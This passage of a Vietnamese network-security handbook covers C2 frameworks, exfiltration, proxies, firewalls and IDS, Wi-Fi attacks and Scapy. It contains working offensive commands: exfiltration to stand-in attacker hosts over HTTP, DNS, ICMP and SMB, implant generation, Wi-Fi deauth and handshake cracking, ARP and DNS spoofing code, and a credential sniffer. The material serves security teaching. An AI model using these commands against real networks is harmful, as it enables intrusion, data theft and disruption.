6. Beacon gọi về → Interactive shell

Beacon features:
- Sleep/jitter (tránh phát hiện)
- Các command: shell, upload, download, screenshot
- Lateral movement: psexec, wmi, winrm
- Pivoting: SOCKS proxy, port forward
- Post-exploitation: mimikatz, kerberos
```

### Sliver (Open Source - Thay thế Cobalt Strike)

```bash
# Cài đặt
curl https://sliver.sh/install | sudo bash

# Khởi động
sliver

# Tạo implant
sliver > generate --mtls attacker-ip --os windows --arch amd64 --save implant.exe

# Tạo listener
sliver > mtls --lhost 0.0.0.0 --lport 8888

# Khi có session
sliver > sessions
sliver > use <session-id>
sliver (IMPLANT) > info
sliver (IMPLANT) > shell
sliver (IMPLANT) > upload /local/file /remote/path
sliver (IMPLANT) > download /remote/file /local/path
sliver (IMPLANT) > portfwd add --remote 172.16.0.10:80 --bind 127.0.0.1:8080
sliver (IMPLANT) > socks5 start
```

### Havoc (Open Source)

```bash
# === Install ===
git clone https://github.com/HavocFramework/Havoc.git
cd Havoc/teamserver
go build
cd ../client
make

# === Start Teamserver ===
./teamserver server --profile profiles/havoc.yaotl -v
# Config file: profiles/havoc.yaotl
# Listeners:
#   - HTTP/HTTPS (customizable headers, URIs, user-agent)
#   - SMB (named pipes - lateral movement)
#   - External C2 (custom protocols)

# === Connect Client ===
./havoc client
# GUI client → connect to teamserver

# === Generate Demon Agent (Implant) ===
# Trong GUI: Attack → Payload → Generate
# Formats: Windows EXE, DLL, Shellcode, Service EXE
# Evasion: Sleep obfuscation (Ekko, Zilean), indirect syscalls
# Stack spoofing, AMSI/ETW patching built-in

# === Post-Exploitation Modules ===
# Demon console:
demon> whoami
demon> shell ipconfig /all
demon> ps                        # Process list
demon> screenshot                # Take screenshot
demon> download C:\secret.txt    # Download file
demon> upload /local/tool.exe    # Upload file
demon> inject x64 PID shellcode  # Process injection
demon> token steal PID           # Token impersonation
demon> dotnet inline-execute Assembly.exe args  # .NET in-memory
demon> bof inline-execute bof.o args            # BOF execution

# === BOF (Beacon Object Files) ===
# Compiled C code chạy trong memory (no new process)
# Compatible với Cobalt Strike BOFs
# Ví dụ: nanodump (LSASS dump), sa-whoami, klist
```

## 5.5 Exfiltration (Trích xuất dữ liệu)

```bash
# === Qua HTTP ===
# Trên attacker:
python3 -m http.server 8080
# Trên victim:
curl -X POST -d @sensitive_file http://attacker:8080/

# === Qua DNS ===
# Encode file thành hex, gửi qua subdomain
xxd -p sensitive_file | while read line; do
  nslookup $line.exfil.attacker.com attacker-dns
done

# === Qua ICMP ===
# Giấu data trong ICMP payload
hping3 -1 --data 200 -E sensitive_file attacker-ip

# === Qua SMB ===
smbclient //attacker/share -U '' -N -c 'put sensitive_file'

# === Qua encrypted channel ===
# Nén, mã hóa, rồi gửi
tar czf - /sensitive/dir | openssl enc -aes-256-cbc -pass pass:key | \
  curl -X POST --data-binary @- http://attacker:8080/
```

---

# PHẦN 6: PROXY & TRAFFIC INTERCEPTION

## 6.1 Charles Proxy

### Charles là gì?
Charles là HTTP/HTTPS proxy cho phép xem, sửa đổi, record tất cả HTTP/HTTPS traffic giữa máy tính và Internet. Rất hữu ích cho:
- Debug mobile app traffic
- Inspect API calls
- Modify requests/responses
- Test với throttling (giả lập mạng chậm)

### Cài đặt và Cấu hình

```
1. Download: https://www.charlesproxy.com/
2. Cài đặt
3. Charles tự động set system proxy (port 8888)
```

### Cấu hình SSL Proxying (HTTPS)

```
Bước 1: Bật SSL Proxying
  Proxy → SSL Proxying Settings → Enable SSL Proxying
  Add: Host: *, Port: 443 (hoặc specific host)

Bước 2: Cài Charles Root Certificate
  Help → SSL Proxying → Install Charles Root Certificate
  
  Trên máy tính:
  - Windows: Certificate import → Trusted Root Certification Authorities
  - macOS: Keychain → Always Trust
  - Linux: Copy cert vào /usr/local/share/ca-certificates/ → update-ca-certificates

  Trên mobile:
  - iOS: Safari → chcp.it/ssl → Install Profile → Settings → General → About → Trust
  - Android: Settings → Security → Install certificate
    (Android 7+ cần thêm vào app manifest: android:networkSecurityConfig)
```

### Cấu hình cho Mobile

```
1. Đảm bảo mobile và máy tính cùng WiFi
2. Charles: Proxy → Proxy Settings → Port: 8888
3. Mobile WiFi Settings → HTTP Proxy → Manual
   - Server: IP máy tính
   - Port: 8888
4. Cài SSL certificate (xem trên)
```

### Tính năng quan trọng

```
=== Structure View vs Sequence View ===
- Structure: Nhóm theo host (dạng cây)
- Sequence: Theo thứ tự thời gian

=== Breakpoints (Chặn và sửa request/response) ===
Proxy → Breakpoints
- Right-click request → Breakpoints
- Khi breakpoint hit: Edit request → Execute
- Sửa headers, body, URL, method

=== Map Remote ===
Tools → Map Remote
- Redirect request từ production → staging
- Ví dụ: api.production.com → api.staging.com

=== Map Local ===
Tools → Map Local
- Trả response từ file local thay vì server
- Dùng để mock API response

=== Rewrite ===
Tools → Rewrite
- Tự động modify headers, body, URL
- Ví dụ: Add header "X-Debug: true" cho tất cả request

=== Throttling ===
Proxy → Throttle Settings
- Giả lập mạng chậm (3G, EDGE, v.v.)
- Hữu ích để test app khi mạng yếu

=== Repeat / Compose ===
- Right-click → Repeat: Gửi lại request
- Right-click → Compose: Sửa và gửi lại

=== Record / Stop Recording ===
- Recording: Charles capture traffic
- Lưu session: File → Save Session
```

### Charles cho Security Testing

```
1. Intercept và sửa API calls để test authorization
2. Replay request với token/session khác
3. Modify response để bypass client-side validation
4. SSL Proxying để xem encrypted traffic
5. Xem hidden API endpoints mà app gọi
6. Export session → phân tích offline
```

## 6.2 Burp Suite

### Burp Suite là gì?
Burp Suite là công cụ số 1 cho web application security testing. Powerful hơn Charles cho security research.

### Cấu hình

```
1. Proxy → Options → Proxy Listeners → 127.0.0.1:8080
2. Browser proxy: 127.0.0.1:8080
   - Firefox: Settings → Network → Manual Proxy
   - Chrome: dùng FoxyProxy extension
3. SSL: Proxy → Options → Import/Export CA Certificate
   - Truy cập http://burp/ → Download CA cert → Import vào browser
```

### Các module quan trọng

```
=== Proxy (Intercept) ===
- Intercept: ON/OFF → Chặn request, sửa, forward
- HTTP history: Xem tất cả request đã đi qua
- WebSockets: Xem WebSocket messages

=== Target ===
- Site Map: Cây cấu trúc website
- Scope: Define target scope (chỉ scan domain cho phép)

=== Scanner (Pro) ===
- Active scan: Tự động tìm vulnerability
- Passive scan: Phân tích response

=== Intruder ===
- Positions: Đánh dấu parameter cần fuzz
- Attack types:
  - Sniper: 1 payload, 1 position tại 1 thời điểm
  - Battering Ram: 1 payload, tất cả position cùng lúc
  - Pitchfork: Nhiều payload list, position 1-1
  - Cluster Bomb: Tất cả tổ hợp payloads

Ví dụ brute force login:
POST /login
username=§admin§&password=§test§
Payload 1: username list
Payload 2: password list
Attack type: Cluster Bomb

=== Repeater ===
- Gửi request, sửa, gửi lại → test thủ công
- So sánh response side by side

=== Decoder ===
- Encode/Decode: Base64, URL, HTML, Hex, v.v.
- Hash: MD5, SHA1, SHA256

=== Comparer ===
- So sánh 2 response → tìm khác biệt

=== Sequencer ===
- Phân tích chất lượng random của token/session
- Thu thập nhiều token → thống kê entropy
```

### Burp Extensions hữu ích

```
- Autorize: Test IDOR/authorization
- Logger++: Log nâng cao
- Active Scan++: Thêm scan checks
- JWT Editor: Sửa/tạo JWT tokens
- Param Miner: Tìm hidden parameters
- Turbo Intruder: Brute force siêu nhanh
- Collaborator Everywhere: Detect SSRF, blind XSS
- Hackvertor: Encode/decode nâng cao
```

## 6.3 Proxychains

### Proxychains là gì?
Force bất kỳ TCP connection nào đi qua proxy (SOCKS4/5, HTTP). Dùng để ẩn IP hoặc pivot qua compromised host.

### Cấu hình

```bash
# File config: /etc/proxychains4.conf (hoặc /etc/proxychains.conf)

# === Chế độ chaining ===

# Dynamic chain: thử proxy theo thứ tự, skip proxy chết
dynamic_chain

# Strict chain: phải đi qua TẤT CẢ proxy theo thứ tự
# strict_chain

# Random chain: chọn random proxy từ list
# random_chain

# === Proxy list (ở cuối file) ===
[ProxyList]
# type  host       port  user  pass
socks5  127.0.0.1  1080
socks4  127.0.0.1  9050           # Tor
http    10.10.10.5 3128
socks5  10.10.10.5 1080  user  pass

# === DNS resolution qua proxy ===
proxy_dns
```

### Sử dụng

```bash
# Scan qua proxy
proxychains nmap -sT -Pn 172.16.0.0/24    # Chỉ dùng -sT (TCP connect)
# KHÔNG dùng -sS (SYN scan) vì proxychains chỉ proxy TCP connections

# Tool bất kỳ qua proxy
proxychains curl http://internal-site.local
proxychains firefox
proxychains ssh user@172.16.0.10
proxychains crackmapexec smb 172.16.0.0/24

# Kết hợp với SSH SOCKS proxy
ssh -D 1080 user@pivot-host
# proxychains.conf: socks5 127.0.0.1 1080
proxychains nmap -sT -Pn 172.16.0.10
```

### Proxychains + Tor

```bash
# Cài Tor
sudo apt install tor
sudo systemctl start tor    # SOCKS proxy ở 127.0.0.1:9050

# proxychains.conf:
[ProxyList]
socks5 127.0.0.1 9050

# Dùng
proxychains nmap -sT -Pn target
proxychains curl http://check.torproject.org
```

### Lưu ý quan trọng

```
1. Proxychains chỉ proxy TCP, KHÔNG proxy UDP/ICMP
   → Không dùng được: ping, traceroute, nmap -sU, DNS (trừ khi có proxy_dns)
   
2. Nmap qua proxychains:
   - Chỉ dùng -sT (TCP Connect scan)
   - Dùng -Pn (skip host discovery vì ICMP không qua proxy)
   - Chậm → scan ít port

3. Performance: Mỗi proxy thêm = thêm latency
   → Dùng ít proxy nhất có thể cho scanning
```

## 6.4 mitmproxy

### mitmproxy là gì?
Interactive HTTPS proxy, command-line alternative cho Burp Suite. Free và scriptable bằng Python.

```bash
# Cài đặt
pip install mitmproxy

# Chạy
mitmproxy           # Interactive TUI
mitmweb             # Web interface (port 8081)
mitmdump            # Command line (không interactive)

# Xem traffic
mitmproxy -p 8080

# Filter
mitmproxy -p 8080 --set flow_detail=3    # Full detail

# Script Python
mitmdump -s modify_request.py
```

### Script mitmproxy (Python)

```python
# modify_request.py
from mitmproxy import http

def request(flow: http.HTTPFlow):
    # Thêm header vào mọi request
    flow.request.headers["X-Custom"] = "injected"
    
    # Log URL
    print(f">> {flow.request.method} {flow.request.url}")

def response(flow: http.HTTPFlow):
    # Sửa response
    if "api/secret" in flow.request.url:
        flow.response.text = flow.response.text.replace("hidden", "exposed")
    
    # Inject JavaScript vào HTML response
    if "text/html" in flow.response.headers.get("content-type", ""):
        flow.response.text = flow.response.text.replace(
            "</body>",
            "<script>alert('injected')</script></body>"
        )
```

## 6.5 SOCKS Proxy vs HTTP Proxy

```
HTTP Proxy:
- Chỉ proxy HTTP/HTTPS traffic
- Proxy hiểu HTTP protocol → có thể cache, filter, modify
- Client gửi: CONNECT host:port HTTP/1.1
- Dùng cho: Web browsing, API testing

SOCKS4 Proxy:
- Proxy bất kỳ TCP traffic
- Không hiểu protocol → chỉ forward bytes
- Không hỗ trợ UDP, không hỗ trợ authentication
- Dùng cho: Tunneling

SOCKS5 Proxy:
- Proxy TCP và UDP
- Hỗ trợ authentication (username/password)
- Hỗ trợ DNS resolution qua proxy
- Dùng cho: Tunneling, Tor, SSH dynamic forwarding

So sánh:
┌──────────┬──────────┬──────────┬──────────┐
│ Feature  │ HTTP     │ SOCKS4   │ SOCKS5   │
├──────────┼──────────┼──────────┼──────────┤
│ TCP      │ ✓ (HTTP) │ ✓        │ ✓        │
│ UDP      │ ✗        │ ✗        │ ✓        │
│ Auth     │ Basic    │ ✗        │ ✓        │
│ DNS      │ Proxy    │ Client   │ Both     │
│ Protocol │ HTTP     │ Any TCP  │ Any      │
└──────────┴──────────┴──────────┴──────────┘
```

---

# PHẦN 7: FIREWALL & DEFENSE

## 7.1 Firewall Concepts

### Firewall là gì?
Firewall kiểm soát traffic vào/ra dựa trên rules. Có thể là hardware hoặc software.

### Các loại Firewall

```
1. Packet Filter Firewall (Stateless)
   - Kiểm tra từng packet độc lập
   - Dựa trên: Source IP, Dest IP, Source Port, Dest Port, Protocol
   - Nhanh nhưng dễ bypass
   - Ví dụ: iptables rules cơ bản

2. Stateful Firewall
   - Theo dõi trạng thái kết nối (connection tracking)
   - Biết packet thuộc kết nối nào (NEW, ESTABLISHED, RELATED)
   - Ví dụ: iptables với conntrack, Windows Firewall

3. Application Layer Firewall (WAF)
   - Hiểu protocol ở Layer 7
   - Có thể inspect nội dung HTTP, FTP, DNS
   - Block SQLi, XSS, v.v.
   - Ví dụ: ModSecurity, AWS WAF, Cloudflare

4. Next-Generation Firewall (NGFW)
   - Kết hợp tất cả: stateful + application aware + IDS/IPS
   - Deep packet inspection
   - Ví dụ: Palo Alto, Fortinet, Check Point
```

## 7.2 iptables (Linux Firewall)

### Kiến trúc iptables

```
Tables:
├── filter (mặc định) - Filtering traffic
│   ├── INPUT    - Traffic đến server
│   ├── FORWARD  - Traffic đi qua server (routing)
│   └── OUTPUT   - Traffic từ server đi ra
├── nat - Network Address Translation
│   ├── PREROUTING  - Trước khi routing (DNAT)
│   ├── POSTROUTING - Sau khi routing (SNAT/MASQUERADE)
│   └── OUTPUT      - NAT cho local traffic
├── mangle - Modify packet headers
└── raw    - Connection tracking exceptions
```

### iptables Commands

```bash
# === XEM RULES ===
sudo iptables -L -n -v                    # Liệt kê rules (filter table)
sudo iptables -L -n -v --line-numbers     # Với số dòng
sudo iptables -t nat -L -n -v             # NAT table

# === BASIC RULES ===

# Block IP cụ thể
sudo iptables -A INPUT -s 10.10.10.100 -j DROP

# Cho phép SSH (port 22)
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Cho phép HTTP/HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Cho phép loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Cho phép established connections
sudo iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Block tất cả traffic khác (DEFAULT DENY)
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT

# === RULES NÂNG CAO ===

# Rate limit SSH (chống brute force)
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent \
  --set --name SSH
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent \
  --update --seconds 60 --hitcount 4 --name SSH -j DROP

# Block port scan (SYN flood protection)
sudo iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 3 -j ACCEPT
sudo iptables -A INPUT -p tcp --syn -j DROP

# Block ICMP (ẩn khỏi ping)
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP

# Cho phép ping nhưng rate limit
sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit \
  --limit 1/s --limit-burst 4 -j ACCEPT

# Log trước khi drop
sudo iptables -A INPUT -j LOG --log-prefix "DROPPED: " --log-level 7
sudo iptables -A INPUT -j DROP

# Block specific country (dùng ipset)
sudo ipset create cn hash:net
sudo ipset add cn 1.0.0.0/8
sudo iptables -A INPUT -m set --match-set cn src -j DROP

# === NAT ===

# SNAT (Source NAT - thay đổi source IP khi đi ra)
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# DNAT (Destination NAT - port forwarding từ ngoài vào)
sudo iptables -t nat -A PREROUTING -p tcp --dport 8080 -j DNAT \
  --to-destination 192.168.1.100:80

# Port forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 \
  -j DNAT --to 192.168.1.100:80
sudo iptables -t nat -A POSTROUTING -o eth1 -j MASQUERADE

# === QUẢN LÝ RULES ===

# Xóa rule theo số dòng
sudo iptables -D INPUT 3

# Xóa tất cả rules
sudo iptables -F

# Lưu rules (Debian/Ubuntu)
sudo iptables-save > /etc/iptables/rules.v4
sudo ip6tables-save > /etc/iptables/rules.v6

# Restore rules
sudo iptables-restore < /etc/iptables/rules.v4
```

### iptables Firewall Script mẫu (Production)

```bash
#!/bin/bash
# Firewall script cho web server

# Xóa rules cũ
iptables -F
iptables -X
iptables -t nat -F

# Default policy: DROP tất cả
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT

# Loopback
iptables -A INPUT -i lo -j ACCEPT

# Established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# SSH (rate limited)
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --set --name SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW \
  -m recent --update --seconds 60 --hitcount 4 --name SSH -j DROP
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# HTTP/HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# DNS (nếu là DNS server)
# iptables -A INPUT -p tcp --dport 53 -j ACCEPT
# iptables -A INPUT -p udp --dport 53 -j ACCEPT

# ICMP (limited)
iptables -A INPUT -p icmp --icmp-type echo-request \
  -m limit --limit 1/s -j ACCEPT

# Anti-spoofing
iptables -A INPUT -s 10.0.0.0/8 -i eth0 -j DROP
iptables -A INPUT -s 172.16.0.0/12 -i eth0 -j DROP
iptables -A INPUT -s 192.168.0.0/16 -i eth0 -j DROP

# Log dropped
iptables -A INPUT -j LOG --log-prefix "FW-DROP: "
iptables -A INPUT -j DROP

# Lưu
iptables-save > /etc/iptables/rules.v4
```

## 7.3 nftables (iptables thế hệ mới)

```bash
# nftables thay thế iptables từ Linux kernel 3.13+
# Cú pháp dễ đọc hơn, performance tốt hơn

# Liệt kê rules
sudo nft list ruleset

# Tạo table và chain
sudo nft add table inet filter
sudo nft add chain inet filter input { type filter hook input priority 0 \; policy drop \; }

# Thêm rules
sudo nft add rule inet filter input iif lo accept
sudo nft add rule inet filter input ct state established,related accept
sudo nft add rule inet filter input tcp dport 22 accept
sudo nft add rule inet filter input tcp dport { 80, 443 } accept
sudo nft add rule inet filter input icmp type echo-request limit rate 1/second accept

# NAT
sudo nft add table ip nat
sudo nft add chain ip nat postrouting { type nat hook postrouting priority 100 \; }
sudo nft add rule ip nat postrouting oifname "eth0" masquerade

# Lưu
sudo nft list ruleset > /etc/nftables.conf
```

## 7.4 Windows Firewall

```powershell
# === PowerShell ===

# Xem tất cả rules
Get-NetFirewallRule | Format-Table Name, DisplayName, Direction, Action

# Xem rules active
Get-NetFirewallRule -Enabled True

# Cho phép port
New-NetFirewallRule -DisplayName "Allow SSH" -Direction Inbound `
  -Protocol TCP -LocalPort 22 -Action Allow

# Block IP
New-NetFirewallRule -DisplayName "Block Attacker" -Direction Inbound `
  -RemoteAddress 10.10.10.100 -Action Block

# Block port
New-NetFirewallRule -DisplayName "Block Telnet" -Direction Inbound `
  -Protocol TCP -LocalPort 23 -Action Block

# Cho phép program
New-NetFirewallRule -DisplayName "Allow App" -Direction Inbound `
  -Program "C:\App\app.exe" -Action Allow

# Xóa rule
Remove-NetFirewallRule -DisplayName "Allow SSH"

# Disable firewall (KHÔNG khuyến khích)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Xem profile
Get-NetFirewallProfile

# === netsh (CMD) ===
netsh advfirewall show allprofiles
netsh advfirewall firewall add rule name="Allow SSH" dir=in action=allow protocol=tcp localport=22
netsh advfirewall firewall show rule name=all
netsh advfirewall firewall delete rule name="Allow SSH"
```

## 7.5 pfSense (Open Source Firewall/Router)

```
pfSense là firewall/router dựa trên FreeBSD. Dùng cho:
- Firewall doanh nghiệp
- VPN server
- Network segmentation
- IDS/IPS (với Suricata/Snort)

Cấu hình cơ bản:
1. WAN interface: Kết nối Internet
2. LAN interface: Mạng nội bộ
3. Rules: Firewall → Rules → [Interface] → Add

Rule structure:
- Action: Pass / Block / Reject
- Interface: WAN / LAN / OPT1
- Direction: In / Out
- Protocol: TCP / UDP / ICMP / Any
- Source: Network / IP / Alias
- Destination: Network / IP / Alias
- Port: Specific / Range / Alias

VPN:
- OpenVPN: Wizard → Server → Client export
- IPsec: VPN → IPsec → Tunnels
- WireGuard: System → Package Manager → Install WireGuard
```

## 7.6 Firewall Evasion Techniques (Red Team)

```bash
# === Fragmentation ===
# Chia packet nhỏ để bypass inspection
nmap -f 192.168.1.100              # Fragment packets (8 bytes)
nmap -f -f 192.168.1.100           # 16-byte fragments
nmap --mtu 24 192.168.1.100        # Custom MTU

# === Decoy ===
# Giả mạo nhiều source IP
nmap -D RND:10 192.168.1.100       # 10 random decoys
nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.100

# === Source port manipulation ===
# Một số firewall cho phép traffic từ port 53 (DNS) hoặc 80
nmap --source-port 53 192.168.1.100
nmap -g 53 192.168.1.100

# === Timing ===
nmap -T0 192.168.1.100             # Paranoid (5 min/probe)
nmap -T1 192.168.1.100             # Sneaky (15 sec/probe)
nmap -T2 192.168.1.100             # Polite

# === Idle scan ===
nmap -sI zombie:80 192.168.1.100

# === Custom packets với hping3 ===
# SYN scan giả source port 80
hping3 -S -p 445 -s 80 192.168.1.100

# Xmas scan (FIN + PSH + URG)
hping3 -F -P -U -p 80 192.168.1.100

# === Tunneling qua allowed ports ===
# HTTP tunnel (port 80/443 thường cho phép)
# DNS tunnel (port 53 thường cho phép)
# ICMP tunnel (ICMP đôi khi cho phép)

# === IPv6 ===
# Nhiều firewall chỉ filter IPv4, quên IPv6
nmap -6 fe80::1

# === Packet crafting với Scapy ===
# Xem phần Advanced Topics
```

## 7.7 IDS/IPS (Intrusion Detection/Prevention System)

### Snort

```bash
# Snort modes:
# 1. Sniffer: tcpdump-like
snort -v -i eth0

# 2. Packet Logger: Log packets
snort -dev -l /var/log/snort

# 3. IDS: Detect intrusion
snort -A console -q -c /etc/snort/snort.conf -i eth0

# Snort rules:
# alert tcp any any -> $HOME_NET 80 (msg:"HTTP GET"; content:"GET"; sid:1000001; rev:1;)

# Rule format:
# action protocol src_ip src_port -> dst_ip dst_port (options)
#
# Actions: alert, log, pass, drop (IPS mode), reject
# Options: msg, content, pcre, sid, rev, classtype, priority
```

### Suricata

```bash
# Suricata (Snort alternative, multi-threaded, faster)
suricata -c /etc/suricata/suricata.yaml -i eth0

# IDS mode
suricata -c /etc/suricata/suricata.yaml -i eth0

# IPS mode (inline)
suricata -c /etc/suricata/suricata.yaml -q 0

# Rules tương thích Snort
# Thêm rule sources: ET Open, ET Pro
```

### Evading IDS/IPS

```bash
# Fragmentation
nmap -f target

# Encryption (IDS không đọc được encrypted traffic)
# Tunnel qua HTTPS/SSH

# Encoding
# URL encode, double encode, unicode

# Polymorphic payloads
# Thay đổi signature mỗi lần

# Timing
# Slow scan dưới threshold

# Protocol-level evasion
# TCP segmentation reassembly differences
# IP fragmentation overlapping
```

---

# PHẦN 8: WIRELESS NETWORK ATTACKS

## 8.1 Wi-Fi Fundamentals

```
Standards:
802.11a  →  5GHz,   54 Mbps
802.11b  →  2.4GHz, 11 Mbps
802.11g  →  2.4GHz, 54 Mbps
802.11n  →  2.4/5GHz, 600 Mbps   (Wi-Fi 4)
802.11ac →  5GHz,   6.9 Gbps    (Wi-Fi 5)
802.11ax →  2.4/5GHz, 9.6 Gbps   (Wi-Fi 6)  — 6GHz = Wi-Fi 6E

Security protocols:
WEP     → Broken, KHÔNG BAO GIỜ dùng
WPA     → TKIP, có weakness
WPA2    → AES-CCMP, chuẩn hiện tại
WPA3    → SAE (Simultaneous Authentication of Equals), mới nhất
WPA2-Enterprise → 802.1X + RADIUS (dùng trong doanh nghiệp)
```

## 8.2 Wireless Reconnaissance

```bash
# Bật monitor mode
sudo airmon-ng start wlan0
# → Interface chuyển thành wlan0mon

# Scan Wi-Fi networks
sudo airodump-ng wlan0mon

# Output:
# BSSID              PWR  CH  ENC   ESSID
# AA:BB:CC:DD:EE:FF  -50  6   WPA2  TargetNetwork
# ...

# Scan channel cụ thể
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Tắt monitor mode
sudo airmon-ng stop wlan0mon
```

## 8.3 WPA/WPA2 Cracking

### 4-Way Handshake Capture

```bash
# Bước 1: Monitor mode
sudo airmon-ng start wlan0

# Bước 2: Scan target
sudo airodump-ng wlan0mon

# Bước 3: Capture handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w handshake wlan0mon

# Bước 4: Deauth client (force reconnect → capture handshake)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# -0 5: Gửi 5 deauth frames

# Khi thấy "WPA handshake: AA:BB:CC:DD:EE:FF" → capture thành công!

# Bước 5: Crack handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Hoặc dùng hashcat (GPU, nhanh hơn nhiều)
# Convert cap → hccapx
hcxpcapngtool -o hash.hc22000 handshake-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### PMKID Attack (Không cần client!)

```bash
# Dùng hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack
hashcat -m 22000 pmkid.hc22000 wordlist.txt
```

## 8.4 Evil Twin Attack

**Nguyên lý**: Tạo AP giả với cùng tên (SSID) → victim kết nối → MITM.

```bash
# Dùng Fluxion (automated)
git clone https://github.com/FluxionNetwork/fluxion
cd fluxion
sudo ./fluxion.sh

# Hoặc thủ công:
# 1. Tạo AP giả với hostapd
# 2. DHCP server (dnsmasq)
# 3. Captive portal (fake login page)
# 4. Deauth real AP → clients reconnect → connect giả

# Dùng wifiphisher
sudo wifiphisher
```

## 8.5 WPA2-Enterprise Attack

```bash
# Dùng eaphammer
sudo python3 eaphammer --bssid AA:BB:CC:DD:EE:FF --essid CorpWifi \
  --channel 6 --interface wlan0 --auth wpa-enterprise --creds

# Khi user kết nối → capture NTLM hash / credentials
```

## 8.6 Bluetooth Attacks

```bash
# Scan Bluetooth devices
hcitool scan
hcitool lescan     # BLE (Bluetooth Low Energy)

# Enumerate services
sdptool browse XX:XX:XX:XX:XX:XX

# BlueSmack (Bluetooth DoS)
l2ping -s 600 XX:XX:XX:XX:XX:XX

# BLE sniffing
btlejack -d XX:XX:XX:XX:XX:XX
```

---

# PHẦN 9: ADVANCED TOPICS

## 9.1 Scapy - Packet Crafting với Python

Scapy cho phép tạo, gửi, nhận, phân tích packet ở mọi tầng.

```python
from scapy.all import *

# === Tạo và gửi packet ===

# ICMP ping
packet = IP(dst="192.168.1.1") / ICMP()
response = sr1(packet, timeout=2)
print(response.summary())

# TCP SYN packet
syn = IP(dst="192.168.1.100") / TCP(dport=80, flags="S")
response = sr1(syn, timeout=2)

# Kiểm tra response
if response:
    if response[TCP].flags == "SA":  # SYN-ACK
        print("Port 80 is OPEN")
    elif response[TCP].flags == "RA":  # RST-ACK
        print("Port 80 is CLOSED")

# === ARP Scan ===
ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.0/24"),
                 timeout=2, verbose=False)
for sent, received in ans:
    print(f"{received.psrc} → {received.hwsrc}")

# === ARP Spoofing ===
def arp_spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(packet, verbose=False)

# === DNS Spoofing ===
def dns_spoof(pkt):
    if pkt.haslayer(DNSQR):
        spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                  UDP(dport=pkt[UDP].sport, sport=53) / \
                  DNS(id=pkt[DNS].id, qr=1, aa=1,
                      qd=pkt[DNS].qd,
                      an=DNSRR(rrname=pkt[DNSQR].qname,
                               rdata="192.168.1.200"))
        send(spoofed, verbose=False)

sniff(filter="udp port 53", prn=dns_spoof)

# === Port Scanner ===
def syn_scan(target, ports):
    results = {}
    for port in ports:
        pkt = IP(dst=target) / TCP(dport=port, flags="S")
        resp = sr1(pkt, timeout=1, verbose=False)
        if resp and resp[TCP].flags == 0x12:  # SYN-ACK
            results[port] = "open"
            # Send RST to close
            send(IP(dst=target) / TCP(dport=port, flags="R"), verbose=False)
        elif resp and resp[TCP].flags == 0x14:  # RST-ACK
            results[port] = "closed"
        else:
            results[port] = "filtered"
    return results

print(syn_scan("192.168.1.100", [22, 80, 443, 8080]))

# === Traceroute ===
ans, unans = sr(IP(dst="8.8.8.8", ttl=(1,30)) / ICMP(), timeout=2)
for sent, received in ans:
    print(f"TTL={sent.ttl}: {received.src}")

# === Sniffing ===
def packet_callback(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(Raw):
        payload = pkt[Raw].load.decode(errors='ignore')
        if "password" in payload.lower() or "pass=" in payload.lower():
            print(f"[!] Possible credentials: {payload[:200]}")

sniff(filter="tcp port 80", prn=packet_callback, store=False)

# === Packet analysis ===
packets = rdpcap("capture.pcap")
for pkt in packets:
    if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
        print(f"DNS Query: {pkt[DNSQR].qname.decode()}")
```

## 9.2 VPN Internals

### VPN Types

```
1. IPsec VPN
   - Transport Mode: Encrypt payload, giữ nguyên IP header
   - Tunnel Mode: Encrypt toàn bộ packet, thêm IP header mới
   - Protocols: ESP (Encapsulating Security Payload), AH (Authentication Header)
   - IKE (Internet Key Exchange) cho key negotiation:
     Phase 1 (ISAKMP SA): Authenticate peers, tạo secure channel
       - Main Mode (6 packets, bảo mật identity) vs Aggressive Mode (3 packets, lộ identity → hash capture!)
     Phase 2 (Quick Mode): Negotiate IPsec SA (encryption + integrity cho data)
       - Tạo session keys cho ESP/AH
   - Attack surface: Aggressive Mode hash capture → offline crack password

2. SSL/TLS VPN
   - Hoạt động ở Layer 4-7
   - OpenVPN (OpenSSL), Cisco AnyConnect
   - Dễ deploy, đi qua NAT/firewall

3. WireGuard
   - Modern, nhanh, simple
   - Dùng Curve25519, ChaCha20, Poly1305
